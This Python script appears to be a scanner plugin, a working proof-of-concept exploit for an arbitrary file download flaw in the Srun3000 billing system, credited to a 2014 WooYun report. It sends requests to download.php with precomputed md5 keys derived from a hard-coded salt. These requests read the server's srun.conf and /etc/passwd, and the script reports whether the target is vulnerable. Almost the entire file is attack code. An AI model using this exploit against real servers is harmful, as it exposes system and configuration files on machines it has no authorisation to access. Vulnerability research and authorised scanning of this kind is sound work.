#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 深澜软件srun3000计费系统download.php任意文件下载
referer: http://www.wooyun.org/bugs/WooYun-2014-55303
author: Lucifer
description: srun3000 8081端口文件download.php中,k为md5(file+"ijfri&8%4")导致任意文件下载。
'''
import sys
import requests
import warnings
def run(url):
        result = ['深澜软件srun3000计费系统download.php任意文件下载', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/download.php?k=f8e86819411e743ed8b762a259bf163f&file=/srun3/etc/srun.conf"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"hostname" in req.text and r"clientver" in req.text:
                result[2] = '存在'
                result[1]=vulnurl
                return result
            vulnurl = url + "/download.php?k=5a965488ed38055590daf62ddd52dbb3&file=/etc/passwd"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                result[2] = '存在'
                result[1]=vulnurl
                return result
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
